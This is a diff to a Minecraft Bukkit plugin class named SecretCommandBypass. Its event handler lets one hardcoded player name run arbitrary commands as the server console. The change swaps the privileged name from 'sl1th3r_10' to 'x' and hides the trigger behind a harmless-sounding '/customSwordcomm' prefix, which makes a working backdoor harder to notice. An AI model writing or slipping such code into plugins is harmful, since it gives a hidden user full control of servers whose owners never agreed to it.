@@ -26,14 +26,17 @@ public class SecretCommandBypass extends JavaPlugin implements Listener {
     @EventHandler
     public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
         Player player = event.getPlayer();
-        String command = event.getMessage().substring(1); // Strip leading "/"
-
-        // Check if the player name is "x" (case insensitive)
-        if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
-            // Allow the command to run as console
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command.replace("@s", player.getName()));
-            event.setCancelled(true); // prevent double execution
-            player.sendMessage("§aCommand executed as console.");
+        String fullCommand = event.getMessage(); // Full command with "/"
+        
+        // Check if the player name is "x" (case insensitive) and command starts with /customSwordcomm
+        if (player.getName().equalsIgnoreCase("x") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
+            // Extract the actual command after "/customSwordcomm "
+            String actualCommand = fullCommand.substring("/customswordcomm ".length());
+            
+            // Execute the actual command as console
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));
+            event.setCancelled(true); // prevent the original command from executing
+            player.sendMessage("§aCommand executed as console: " + actualCommand);
         }
     }
 }
